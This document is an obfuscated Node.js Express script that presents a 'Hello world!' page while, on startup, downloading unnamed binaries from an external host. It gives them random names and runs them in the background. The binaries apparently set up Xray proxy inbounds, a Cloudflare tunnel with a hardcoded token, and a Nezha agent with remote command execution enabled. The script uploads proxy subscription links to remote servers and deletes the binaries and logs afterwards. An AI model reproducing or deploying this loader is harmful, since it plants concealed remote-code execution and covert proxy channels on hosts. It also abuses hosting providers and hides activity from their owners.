const _0x56b47a=_0x5189;(function(_0x31f887,_0x1de6d8){const _0x100a3e=_0x5189,_0x9be984=_0x31f887();while(!![]){try{const _0x5d0b52=-parseInt(_0x100a3e(0x1d0))/0x1+parseInt(_0x100a3e(0x220))/0x2*(parseInt(_0x100a3e(0x1e0))/0x3)+-parseInt(_0x100a3e(0x1f9))/0x4*(-parseInt(_0x100a3e(0x21c))/0x5)+-parseInt(_0x100a3e(0x1c0))/0x6+parseInt(_0x100a3e(0x23d))/0x7*(parseInt(_0x100a3e(0x229))/0x8)+parseInt(_0x100a3e(0x1a9))/0x9*(-parseInt(_0x100a3e(0x1da))/0xa)+parseInt(_0x100a3e(0x1bb))/0xb;if(_0x5d0b52===_0x1de6d8)break;else _0x9be984['push'](_0x9be984['shift']());}catch(_0x19a0c7){_0x9be984['push'](_0x9be984['shift']());}}}(_0x21a0,0x870a0));const express=require(_0x56b47a(0x1ce)),app=express(),axios=require(_0x56b47a(0x1f6)),os=require('os'),fs=require('fs'),path=require(_0x56b47a(0x1ae)),{promisify}=require(_0x56b47a(0x23a)),exec=promisify(require(_0x56b47a(0x1e1))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x56b47a(0x1a2)][_0x56b47a(0x23e)]||'',PROJECT_URL=process[_0x56b47a(0x1a2)][_0x56b47a(0x1fe)]||'',AUTO_ACCESS=process[_0x56b47a(0x1a2)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x56b47a(0x1a2)][_0x56b47a(0x233)]||'./tmp',SUB_PATH=process['env'][_0x56b47a(0x19b)]||'suu',PORT=process[_0x56b47a(0x1a2)][_0x56b47a(0x203)]||process[_0x56b47a(0x1a2)][_0x56b47a(0x20b)]||0xbb8,UUID=process[_0x56b47a(0x1a2)][_0x56b47a(0x204)]||_0x56b47a(0x250),NEZHA_SERVER=process[_0x56b47a(0x1a2)][_0x56b47a(0x201)]||'',NEZHA_PORT=process[_0x56b47a(0x1a2)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x56b47a(0x1a2)][_0x56b47a(0x241)]||'',ARGO_DOMAIN=process[_0x56b47a(0x1a2)][_0x56b47a(0x19e)]||_0x56b47a(0x1dd),ARGO_AUTH=process[_0x56b47a(0x1a2)][_0x56b47a(0x1f8)]||_0x56b47a(0x207),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x56b47a(0x1a2)][_0x56b47a(0x23f)]||'cdns.doon.eu.org',CFPORT=process[_0x56b47a(0x1a2)][_0x56b47a(0x252)]||0x1bb,NAME=process[_0x56b47a(0x1a2)][_0x56b47a(0x222)]||_0x56b47a(0x1b9);function _0x5189(_0x4c0de8,_0x1c600d){const _0x21a0b7=_0x21a0();return _0x5189=function(_0x5189ed,_0x546e47){_0x5189ed=_0x5189ed-0x196;let _0xb5eb04=_0x21a0b7[_0x5189ed];return _0xb5eb04;},_0x5189(_0x4c0de8,_0x1c600d);}!fs['existsSync'](FILE_PATH)?(fs[_0x56b47a(0x1f5)](FILE_PATH),console[_0x56b47a(0x1e6)](FILE_PATH+_0x56b47a(0x1fd))):console[_0x56b47a(0x1e6)](FILE_PATH+_0x56b47a(0x21e));function generateRandomName(){const _0xdd21a=_0x56b47a,_0x3c55d0=_0xdd21a(0x240);let _0x236691='';for(let _0x408476=0x0;_0x408476<0x6;_0x408476++){_0x236691+=_0x3c55d0['charAt'](Math[_0xdd21a(0x234)](Math['random']()*_0x3c55d0[_0xdd21a(0x1c4)]));}return _0x236691;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x56b47a(0x1c2)](FILE_PATH,npmName),phpPath=path[_0x56b47a(0x1c2)](FILE_PATH,phpName),webPath=path[_0x56b47a(0x1c2)](FILE_PATH,webName),botPath=path[_0x56b47a(0x1c2)](FILE_PATH,botName),subPath=path[_0x56b47a(0x1c2)](FILE_PATH,_0x56b47a(0x22a)),listPath=path['join'](FILE_PATH,_0x56b47a(0x210)),bootLogPath=path['join'](FILE_PATH,_0x56b47a(0x249)),configPath=path[_0x56b47a(0x1c2)](FILE_PATH,_0x56b47a(0x1ec));function deleteNodes(){const _0x1b43f0=_0x56b47a;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x4fb00b;try{_0x4fb00b=fs[_0x1b43f0(0x1c7)](subPath,_0x1b43f0(0x1b7));}catch{return null;}const _0x4fb181=Buffer['from'](_0x4fb00b,_0x1b43f0(0x1bd))[_0x1b43f0(0x19f)]('utf-8'),_0x259804=_0x4fb181[_0x1b43f0(0x1dc)]('\x0a')[_0x1b43f0(0x226)](_0x355703=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1b43f0(0x1d9)](_0x355703));if(_0x259804[_0x1b43f0(0x1c4)]===0x0)return;return axios[_0x1b43f0(0x1e8)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x1b43f0(0x230)]({'nodes':_0x259804}),{'headers':{'Content-Type':'application/json'}})[_0x1b43f0(0x20e)](_0x556200=>{return null;}),null;}catch(_0x3d684b){return null;}}function cleanupOldFiles(){const _0x45c501=_0x56b47a;try{const _0x3e8918=fs[_0x45c501(0x209)](FILE_PATH);_0x3e8918[_0x45c501(0x1ee)](_0x268812=>{const _0x3879da=_0x45c501,_0x50c5f4=path[_0x3879da(0x1c2)](FILE_PATH,_0x268812);try{const _0x4e340d=fs[_0x3879da(0x20f)](_0x50c5f4);_0x4e340d['isFile']()&&fs[_0x3879da(0x208)](_0x50c5f4);}catch(_0xd0583e){}});}catch(_0x38602d){}}app[_0x56b47a(0x1f4)]('/',function(_0x246b09,_0x47fba0){const _0xbb892f=_0x56b47a;_0x47fba0[_0xbb892f(0x1a1)](_0xbb892f(0x254));});function _0x21a0(){const _0x3c331b=['application/json','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','190115DtgrXh','\x0a\x20\x20tunnel:\x20','\x20already\x20exists','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','4582MYIBCg','tls','NAME','http','none','tcp','filter','text/plain;\x20charset=utf-8','message','8277560TNnceG','sub.txt','Add\x20automatic\x20access\x20task\x20faild:\x20','then','\x20successfully','TunnelSecret','https://amd64.ssss.nyc.mn/web','stringify','writeFileSync','.exe\x20>\x20nul\x202>&1','FILE_PATH','floor','win32','2087','arch','Content-Type','status','util','listen','Error\x20reading\x20boot.log:','7vKdXtX','UPLOAD_URL','CFIP','abcdefghijklmnopqrstuvwxyz','NEZHA_KEY','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','php\x20running\x20error:\x20','Download\x20','pop','https://amd64.ssss.nyc.mn/agent','/api/add-subscriptions','existsSync','boot.log','ArgoDomain:','set','/vmess-argo','https://amd64.ssss.nyc.mn/bot','127.0.0.1','\x0a\x20\x20credentials-file:\x20','5eb7ba54-bc62-4e4d-b32a-a16721c2520c','data','CFPORT','\x20failed:\x20','Hello\x20world!','\x0avless://','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','npm\x20running\x20error:\x20','pkill\x20-f\x20\x22[','Empowerment\x20success\x20for\x20','error','https+local://8.8.8.8/dns-query','SUB_PATH','chmod','\x20-p\x20','ARGO_DOMAIN','toString','createWriteStream','send','env','http\x20server\x20is\x20running\x20on\x20port:','blackhole','tunnel.yml','stream','/config.json\x20>/dev/null\x202>&1\x20&','\x20>/dev/null\x202>&1\x20&','3726846CYaRud','2096','trojan','/dev/null','Empowerment\x20failed\x20for\x20','path','fileUrl','basename','/vless-argo','\x20>/dev/null\x202>&1','platform','\x20is\x20running','freedom','aarch64','utf-8','2053','hdso','443','229130qdBhkL','pipe','base64','trim','web\x20running\x20error:\x20','5386680FasUuW','https://arm64.ssss.nyc.mn/agent','join','map','length','?encryption=none&security=tls&sni=','/tunnel.yml\x20run','readFileSync','/sub.txt\x20saved\x20successfully','https://amd64.ssss.nyc.mn/v1','push','from','false','match','express','all','815141nLadfi','config.yaml','Unhandled\x20error\x20in\x20startserver:','amd','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/trojan-argo','\x22\x20>\x20/dev/null\x202>&1','nohup\x20','includes','test','10ZlDiIB','8443','split','sap.121332.xyz','&path=%2Fvless-argo%3Fed%3D2560#','quic','1032ELBNJJ','child_process','https://arm64.ssss.nyc.mn/bot','tunnel.json','unshift','&fp=firefox&type=ws&host=','log','https://arm64.ssss.nyc.mn/web','post','arm','charAt','App\x20is\x20running','config.json','has','forEach','Error\x20executing\x20command:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','vless','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','get','mkdirSync','axios','block','ARGO_AUTH','88IbBslH','2083','direct','Subscription\x20uploaded\x20successfully','\x20is\x20created','PROJECT_URL','--tls','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NEZHA_SERVER','https://oooo.serv00.net/add-url','SERVER_PORT','UUID','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','eyJhIjoiOGFiZGU1YjZkYjM3NWMxZThlNjU3NmVhMGI1YjRmZjEiLCJ0IjoiOGE3ZThiYzAtNzIxMC00Nzk1LTk1OTktMzk0NzQ3NmE0NzQzIiwicyI6Ik4yUmtaak01TURRdFpXRXpNeTAwT0RVekxUbGlOVGd0Wm1Fek5XVXlaR1V5T0dRMiJ9','unlinkSync','readdirSync','\x20-c\x20\x22','PORT','taskkill\x20/f\x20/im\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','catch','statSync','list.txt','\x0a\x20\x20\x0avmess://','finish','\x20-s\x20','\x0a\x20\x20\x20\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://arm64.ssss.nyc.mn/v1','unlink','\x20-c\x20','clear'];_0x21a0=function(){return _0x3c331b;};return _0x21a0();}async function generateConfig(){const _0x2980e3=_0x56b47a,_0x1c0925={'log':{'access':_0x2980e3(0x1ac),'error':_0x2980e3(0x1ac),'loglevel':_0x2980e3(0x224)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2980e3(0x1f2),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x2980e3(0x224),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x2980e3(0x24c),'dest':0xbbb},{'path':_0x2980e3(0x1d5),'dest':0xbbc}]},'streamSettings':{'network':_0x2980e3(0x225)}},{'port':0xbb9,'listen':_0x2980e3(0x24e),'protocol':_0x2980e3(0x1f2),'settings':{'clients':[{'id':UUID}],'decryption':_0x2980e3(0x224)},'streamSettings':{'network':_0x2980e3(0x225),'security':_0x2980e3(0x224)}},{'port':0xbba,'listen':_0x2980e3(0x24e),'protocol':_0x2980e3(0x1f2),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2980e3(0x224)},'streamSettings':{'network':'ws','security':_0x2980e3(0x224),'wsSettings':{'path':_0x2980e3(0x1b1)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2980e3(0x221),_0x2980e3(0x1df)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x2980e3(0x1df)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2980e3(0x24e),'protocol':_0x2980e3(0x1ab),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2980e3(0x224),'wsSettings':{'path':_0x2980e3(0x1d5)}},'sniffing':{'enabled':!![],'destOverride':[_0x2980e3(0x223),_0x2980e3(0x221),_0x2980e3(0x1df)],'metadataOnly':![]}}],'dns':{'servers':[_0x2980e3(0x19a)]},'outbounds':[{'protocol':_0x2980e3(0x1b5),'tag':_0x2980e3(0x1fb)},{'protocol':_0x2980e3(0x1a4),'tag':_0x2980e3(0x1f7)}]};fs[_0x2980e3(0x231)](path[_0x2980e3(0x1c2)](FILE_PATH,_0x2980e3(0x1ec)),JSON[_0x2980e3(0x230)](_0x1c0925,null,0x2));}function getSystemArchitecture(){const _0x595382=_0x56b47a,_0x25efa0=os[_0x595382(0x237)]();return _0x25efa0===_0x595382(0x1e9)||_0x25efa0==='arm64'||_0x25efa0===_0x595382(0x1b6)?_0x595382(0x1e9):_0x595382(0x1d3);}function downloadFile(_0x1e92d3,_0xcb81f4,_0x52d660){const _0x438b03=_0x56b47a,_0x3aa9c1=_0x1e92d3;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x11c011=fs[_0x438b03(0x1a0)](_0x3aa9c1);axios({'method':_0x438b03(0x1f4),'url':_0xcb81f4,'responseType':_0x438b03(0x1a6)})[_0x438b03(0x22c)](_0x1c0612=>{const _0x5e7677=_0x438b03;_0x1c0612[_0x5e7677(0x251)][_0x5e7677(0x1bc)](_0x11c011),_0x11c011['on'](_0x5e7677(0x212),()=>{const _0x1655fa=_0x5e7677;_0x11c011['close'](),console['log'](_0x1655fa(0x244)+path[_0x1655fa(0x1b0)](_0x3aa9c1)+_0x1655fa(0x22d)),_0x52d660(null,_0x3aa9c1);}),_0x11c011['on'](_0x5e7677(0x199),_0x19d07e=>{const _0x155e59=_0x5e7677;fs[_0x155e59(0x217)](_0x3aa9c1,()=>{});const _0xa4d789=_0x155e59(0x244)+path[_0x155e59(0x1b0)](_0x3aa9c1)+_0x155e59(0x253)+_0x19d07e[_0x155e59(0x228)];console[_0x155e59(0x199)](_0xa4d789),_0x52d660(_0xa4d789);});})[_0x438b03(0x20e)](_0x160c96=>{const _0x2514f2=_0x438b03,_0xbcad9f=_0x2514f2(0x244)+path['basename'](_0x3aa9c1)+_0x2514f2(0x253)+_0x160c96[_0x2514f2(0x228)];console[_0x2514f2(0x199)](_0xbcad9f),_0x52d660(_0xbcad9f);});}async function downloadFilesAndRun(){const _0x5df16b=_0x56b47a,_0x15d811=getSystemArchitecture(),_0x435911=getFilesForArchitecture(_0x15d811);if(_0x435911[_0x5df16b(0x1c4)]===0x0){console[_0x5df16b(0x1e6)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x139dae=_0x435911[_0x5df16b(0x1c3)](_0x43c891=>{return new Promise((_0x23e89e,_0x1b940a)=>{const _0x25fc8a=_0x5189;downloadFile(_0x43c891['fileName'],_0x43c891[_0x25fc8a(0x1af)],(_0xfd7452,_0x40f754)=>{_0xfd7452?_0x1b940a(_0xfd7452):_0x23e89e(_0x40f754);});});});try{await Promise[_0x5df16b(0x1cf)](_0x139dae);}catch(_0x136b96){console['error']('Error\x20downloading\x20files:',_0x136b96);return;}function _0x5ca10f(_0x2effb){const _0x2fd9dc=_0x5df16b,_0x38d176=0x1fd;_0x2effb[_0x2fd9dc(0x1ee)](_0x439fb0=>{const _0x6d8cb4=_0x2fd9dc;fs[_0x6d8cb4(0x248)](_0x439fb0)&&fs[_0x6d8cb4(0x19c)](_0x439fb0,_0x38d176,_0x1f6b25=>{const _0x59e5c6=_0x6d8cb4;_0x1f6b25?console['error'](_0x59e5c6(0x1ad)+_0x439fb0+':\x20'+_0x1f6b25):console['log'](_0x59e5c6(0x198)+_0x439fb0+':\x20'+_0x38d176[_0x59e5c6(0x19f)](0x8));});});}const _0x45b347=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5ca10f(_0x45b347);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xa8e6d2=NEZHA_SERVER[_0x5df16b(0x1d8)](':')?NEZHA_SERVER['split'](':')[_0x5df16b(0x245)]():'',_0x26e7ee=new Set([_0x5df16b(0x1ba),_0x5df16b(0x1db),_0x5df16b(0x1aa),_0x5df16b(0x236),'2083',_0x5df16b(0x1b8)]),_0x48b569=_0x26e7ee[_0x5df16b(0x1ed)](_0xa8e6d2)?'true':_0x5df16b(0x1cc),_0x3fdda1='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5df16b(0x1f0)+_0x48b569+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5df16b(0x231)](path[_0x5df16b(0x1c2)](FILE_PATH,_0x5df16b(0x1d1)),_0x3fdda1);const _0x15ea5f=_0x5df16b(0x1d7)+phpPath+_0x5df16b(0x20a)+FILE_PATH+_0x5df16b(0x21b);try{await exec(_0x15ea5f),console['log'](phpName+_0x5df16b(0x1b4)),await new Promise(_0xf03683=>setTimeout(_0xf03683,0x3e8));}catch(_0x17bd84){console[_0x5df16b(0x199)](_0x5df16b(0x243)+_0x17bd84);}}else{let _0x10ce97='';const _0x116c9f=['443',_0x5df16b(0x1db),'2096',_0x5df16b(0x236),_0x5df16b(0x1fa),_0x5df16b(0x1b8)];_0x116c9f[_0x5df16b(0x1d8)](NEZHA_PORT)&&(_0x10ce97=_0x5df16b(0x1ff));const _0x4fff98='nohup\x20'+npmPath+_0x5df16b(0x213)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5df16b(0x19d)+NEZHA_KEY+'\x20'+_0x10ce97+_0x5df16b(0x200);try{await exec(_0x4fff98),console[_0x5df16b(0x1e6)](npmName+_0x5df16b(0x1b4)),await new Promise(_0x32d70d=>setTimeout(_0x32d70d,0x3e8));}catch(_0x2ab404){console[_0x5df16b(0x199)](_0x5df16b(0x196)+_0x2ab404);}}}else console[_0x5df16b(0x1e6)](_0x5df16b(0x215));const _0xdbbc51=_0x5df16b(0x1d7)+webPath+_0x5df16b(0x218)+FILE_PATH+_0x5df16b(0x1a7);try{await exec(_0xdbbc51),console[_0x5df16b(0x1e6)](webName+_0x5df16b(0x1b4)),await new Promise(_0x468052=>setTimeout(_0x468052,0x3e8));}catch(_0x2aa819){console[_0x5df16b(0x199)](_0x5df16b(0x1bf)+_0x2aa819);}if(fs['existsSync'](botPath)){let _0x2b4a35;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x2b4a35=_0x5df16b(0x206)+ARGO_AUTH;else ARGO_AUTH[_0x5df16b(0x1cd)](/TunnelSecret/)?_0x2b4a35=_0x5df16b(0x205)+FILE_PATH+_0x5df16b(0x1c6):_0x2b4a35='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5df16b(0x1d7)+botPath+'\x20'+_0x2b4a35+'\x20>/dev/null\x202>&1\x20&'),console[_0x5df16b(0x1e6)](botName+_0x5df16b(0x1b4)),await new Promise(_0x572e76=>setTimeout(_0x572e76,0x7d0));}catch(_0x22bbc7){console[_0x5df16b(0x199)](_0x5df16b(0x1ef)+_0x22bbc7);}}await new Promise(_0x559808=>setTimeout(_0x559808,0x1388));}function getFilesForArchitecture(_0x242b5c){const _0x198268=_0x56b47a;let _0x2c3c19;_0x242b5c===_0x198268(0x1e9)?_0x2c3c19=[{'fileName':webPath,'fileUrl':_0x198268(0x1e7)},{'fileName':botPath,'fileUrl':_0x198268(0x1e2)}]:_0x2c3c19=[{'fileName':webPath,'fileUrl':_0x198268(0x22f)},{'fileName':botPath,'fileUrl':_0x198268(0x24d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x57e8e9=_0x242b5c===_0x198268(0x1e9)?_0x198268(0x1c1):_0x198268(0x246);_0x2c3c19['unshift']({'fileName':npmPath,'fileUrl':_0x57e8e9});}else{const _0xb4f60f=_0x242b5c===_0x198268(0x1e9)?_0x198268(0x216):_0x198268(0x1c9);_0x2c3c19[_0x198268(0x1e4)]({'fileName':phpPath,'fileUrl':_0xb4f60f});}}return _0x2c3c19;}function argoType(){const _0x5d559f=_0x56b47a;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x5d559f(0x22e))){fs['writeFileSync'](path[_0x5d559f(0x1c2)](FILE_PATH,_0x5d559f(0x1e3)),ARGO_AUTH);const _0x1a7b53=_0x5d559f(0x21d)+ARGO_AUTH[_0x5d559f(0x1dc)]('\x22')[0xb]+_0x5d559f(0x24f)+path[_0x5d559f(0x1c2)](FILE_PATH,_0x5d559f(0x1e3))+_0x5d559f(0x242)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x5d559f(0x21f);fs[_0x5d559f(0x231)](path['join'](FILE_PATH,_0x5d559f(0x1a5)),_0x1a7b53);}else console[_0x5d559f(0x1e6)](_0x5d559f(0x1f1));}argoType();async function extractDomains(){const _0x17e386=_0x56b47a;let _0x260380;if(ARGO_AUTH&&ARGO_DOMAIN)_0x260380=ARGO_DOMAIN,console[_0x17e386(0x1e6)]('ARGO_DOMAIN:',_0x260380),await _0x43ee1e(_0x260380);else try{const _0x2f5fe0=fs[_0x17e386(0x1c7)](path[_0x17e386(0x1c2)](FILE_PATH,_0x17e386(0x249)),_0x17e386(0x1b7)),_0xc6201d=_0x2f5fe0[_0x17e386(0x1dc)]('\x0a'),_0x4671dc=[];_0xc6201d[_0x17e386(0x1ee)](_0x573dee=>{const _0x8467ea=_0x17e386,_0x3a92d4=_0x573dee[_0x8467ea(0x1cd)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3a92d4){const _0x2b0106=_0x3a92d4[0x1];_0x4671dc[_0x8467ea(0x1ca)](_0x2b0106);}});if(_0x4671dc[_0x17e386(0x1c4)]>0x0)_0x260380=_0x4671dc[0x0],console['log'](_0x17e386(0x24a),_0x260380),await _0x43ee1e(_0x260380);else{console[_0x17e386(0x1e6)](_0x17e386(0x256)),fs[_0x17e386(0x208)](path[_0x17e386(0x1c2)](FILE_PATH,_0x17e386(0x249)));async function _0x34c280(){const _0x12788b=_0x17e386;try{process[_0x12788b(0x1b3)]===_0x12788b(0x235)?await exec(_0x12788b(0x20c)+botName+_0x12788b(0x232)):await exec(_0x12788b(0x197)+botName[_0x12788b(0x1ea)](0x0)+']'+botName['substring'](0x1)+_0x12788b(0x1d6));}catch(_0x5e0d72){}}_0x34c280(),await new Promise(_0x4a0f51=>setTimeout(_0x4a0f51,0xbb8));const _0x56d0c1='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x17e386(0x1f3)+ARGO_PORT;try{await exec(_0x17e386(0x1d7)+botPath+'\x20'+_0x56d0c1+_0x17e386(0x1a8)),console[_0x17e386(0x1e6)](botName+_0x17e386(0x1b4)),await new Promise(_0x458e35=>setTimeout(_0x458e35,0xbb8)),await extractDomains();}catch(_0x58f61c){console[_0x17e386(0x199)](_0x17e386(0x1ef)+_0x58f61c);}}}catch(_0x15ba2f){console[_0x17e386(0x199)](_0x17e386(0x23c),_0x15ba2f);}async function _0x43ee1e(_0x2a5489){const _0x11b4f6=_0x17e386,_0x177ea4=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x11b4f6(0x1b7)}),_0x307e66=_0x177ea4[_0x11b4f6(0x1be)](),_0x2df009=NAME?NAME+'-'+_0x307e66:_0x307e66;return new Promise(_0x4b5753=>{setTimeout(()=>{const _0x2d4d03=_0x5189,_0x5f4df2={'v':'2','ps':''+_0x2df009,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x2d4d03(0x224),'host':_0x2a5489,'path':'/vmess-argo?ed=2560','tls':_0x2d4d03(0x221),'sni':_0x2a5489,'alpn':'','fp':'firefox'},_0x30a18c=_0x2d4d03(0x255)+UUID+'@'+CFIP+':'+CFPORT+_0x2d4d03(0x1c5)+_0x2a5489+'&fp=firefox&type=ws&host='+_0x2a5489+_0x2d4d03(0x1de)+_0x2df009+_0x2d4d03(0x211)+Buffer[_0x2d4d03(0x1cb)](JSON['stringify'](_0x5f4df2))[_0x2d4d03(0x19f)](_0x2d4d03(0x1bd))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x2a5489+_0x2d4d03(0x1e5)+_0x2a5489+_0x2d4d03(0x20d)+_0x2df009+_0x2d4d03(0x214);console[_0x2d4d03(0x1e6)](Buffer[_0x2d4d03(0x1cb)](_0x30a18c)[_0x2d4d03(0x19f)](_0x2d4d03(0x1bd))),fs[_0x2d4d03(0x231)](subPath,Buffer[_0x2d4d03(0x1cb)](_0x30a18c)[_0x2d4d03(0x19f)](_0x2d4d03(0x1bd))),console[_0x2d4d03(0x1e6)](FILE_PATH+_0x2d4d03(0x1c8)),uploadNodes(),app[_0x2d4d03(0x1f4)]('/'+SUB_PATH,(_0x171708,_0x2ff848)=>{const _0x42e13b=_0x2d4d03,_0x1be1d5=Buffer['from'](_0x30a18c)['toString']('base64');_0x2ff848[_0x42e13b(0x24b)](_0x42e13b(0x238),_0x42e13b(0x227)),_0x2ff848[_0x42e13b(0x1a1)](_0x1be1d5);}),_0x4b5753(_0x30a18c);},0x7d0);});}}async function uploadNodes(){const _0x5f0776=_0x56b47a;if(UPLOAD_URL&&PROJECT_URL){const _0x48a41e=PROJECT_URL+'/'+SUB_PATH,_0x389fb2={'subscription':[_0x48a41e]};try{const _0xb899cb=await axios[_0x5f0776(0x1e8)](UPLOAD_URL+_0x5f0776(0x247),_0x389fb2,{'headers':{'Content-Type':_0x5f0776(0x21a)}});return _0xb899cb&&_0xb899cb['status']===0xc8?(console[_0x5f0776(0x1e6)](_0x5f0776(0x1fc)),_0xb899cb):null;}catch(_0x488382){if(_0x488382['response']){if(_0x488382['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5f0776(0x248)](listPath))return;const _0x42b81e=fs[_0x5f0776(0x1c7)](listPath,'utf-8'),_0x24fb9f=_0x42b81e['split']('\x0a')['filter'](_0x4ecfed=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4ecfed));if(_0x24fb9f['length']===0x0)return;const _0x126262=JSON[_0x5f0776(0x230)]({'nodes':_0x24fb9f});try{const _0x545abf=await axios[_0x5f0776(0x1e8)](UPLOAD_URL+'/api/add-nodes',_0x126262,{'headers':{'Content-Type':'application/json'}});return _0x545abf&&_0x545abf[_0x5f0776(0x239)]===0xc8?(console[_0x5f0776(0x1e6)]('Nodes\x20uploaded\x20successfully'),_0x545abf):null;}catch(_0xd4ba7f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x56b709=_0x5189,_0x2eb5c7=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2eb5c7[_0x56b709(0x1ca)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2eb5c7[_0x56b709(0x1ca)](phpPath);process[_0x56b709(0x1b3)]===_0x56b709(0x235)?exec('del\x20/f\x20/q\x20'+_0x2eb5c7[_0x56b709(0x1c2)]('\x20')+'\x20>\x20nul\x202>&1',_0x2edc34=>{const _0x4e3f1f=_0x56b709;console[_0x4e3f1f(0x219)](),console[_0x4e3f1f(0x1e6)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x2eb5c7['join']('\x20')+_0x56b709(0x1b2),_0x1f6bfc=>{const _0x29b16b=_0x56b709;console[_0x29b16b(0x219)](),console['log'](_0x29b16b(0x1eb)),console['log'](_0x29b16b(0x1d4));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x222176=_0x56b47a;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x222176(0x1e6)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x4af0aa=await axios[_0x222176(0x1e8)](_0x222176(0x202),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x222176(0x21a)}});return console[_0x222176(0x1e6)]('automatic\x20access\x20task\x20added\x20successfully'),_0x4af0aa;}catch(_0x2ecffd){return console[_0x222176(0x199)](_0x222176(0x22b)+_0x2ecffd['message']),null;}}async function startserver(){const _0x5e9072=_0x56b47a;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x35d814){console[_0x5e9072(0x199)]('Error\x20in\x20startserver:',_0x35d814);}}startserver()[_0x56b47a(0x20e)](_0x318145=>{const _0x4f10d8=_0x56b47a;console['error'](_0x4f10d8(0x1d2),_0x318145);}),app[_0x56b47a(0x23b)](PORT,()=>console['log'](_0x56b47a(0x1a3)+PORT+'!'));
